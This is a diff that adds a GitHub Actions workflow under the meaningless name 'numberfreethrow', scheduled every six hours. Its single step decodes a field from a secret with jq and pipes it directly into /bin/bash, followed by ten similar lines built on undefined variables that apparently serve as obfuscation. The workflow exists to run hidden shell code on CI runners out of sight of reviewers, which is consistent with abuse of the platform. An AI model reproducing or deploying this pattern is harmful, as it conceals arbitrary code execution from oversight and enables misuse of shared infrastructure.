@@ -1,0 +1,29 @@
+name: numberfreethrow
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: numberfreethrow
+        env:
+          mivjs7393: ${{ secrets.mivjs7393 }}
+        run: |
+          echo $mivjs7393 | jq -r .ftqa01406 | /bin/bash
+          echo $dup81 | jq -r .exr6 | /bin/bash
+          echo $vwm1330 | jq -r .nbq79 | /bin/bash
+          echo $fvmh0974 | jq -r .cnkt66 | /bin/bash
+          echo $dctod90245 | jq -r .dish4 | /bin/bash
+          echo $qb48535 | jq -r .c94 | /bin/bash
+          echo $hqjh9 | jq -r .g67498 | /bin/bash
+          echo $wko55 | jq -r .em2885 | /bin/bash
+          echo $eegbk6 | jq -r .oubc36318 | /bin/bash
+          echo $fdnw1 | jq -r .yb4067 | /bin/bash
+          echo $iklpz85637 | jq -r .gqg0 | /bin/bash
+
